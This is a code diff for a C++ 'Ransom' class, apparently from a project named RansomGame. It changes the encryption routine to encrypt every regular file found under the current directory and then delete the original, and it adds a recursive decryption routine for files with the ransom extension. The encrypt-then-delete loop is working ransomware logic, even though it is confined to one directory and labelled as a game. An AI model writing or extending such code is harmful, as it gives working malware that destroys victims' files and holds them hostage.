@@ -22,9 +22,8 @@ void Ransom::run_encryption_logic()
 			auto entry_name = absolute(entry).generic_string();
 			
 			std::cout << "Encrypting file " << entry_name << std::endl;
-			std::string aa = entry_name + custom_extension_name;
 			encrypt_files(const_cast<char*>(entry_name.c_str()));
-			decrypt_files(const_cast<char*>(aa.c_str()));
+			delete_file(const_cast<char*>(entry_name.c_str()));
 		}
 	}
 }
@@ -32,6 +31,23 @@ void Ransom::run_encryption_logic()
 void Ransom::run_decryption_logic()
 {
 	// if isEncrypted, find all files with the proper custom extension
+	const auto path = std::filesystem::current_path();
+
+	for (const auto& entry : std::filesystem::recursive_directory_iterator(path))
+	{
+		if (entry.path().filename() == "RansomGame.exe" || entry.path().filename() == encryption_file_)
+		{
+			// Do not encrypt the key file, the executable itself, or an already encrypted file
+		}
+		else if (entry.is_regular_file() && entry.path().filename().extension() == custom_extension_name)
+		{
+			auto entry_name = absolute(entry).generic_string();
+
+			std::cout << "Decrypting file " << entry_name << std::endl;
+			decrypt_files(const_cast<char*>(entry_name.c_str()));
+			delete_file(const_cast<char*>(entry_name.c_str()));
+		}
+	}
 }
 
 inline bool EndOfFile(const CryptoPP::FileSource& file)
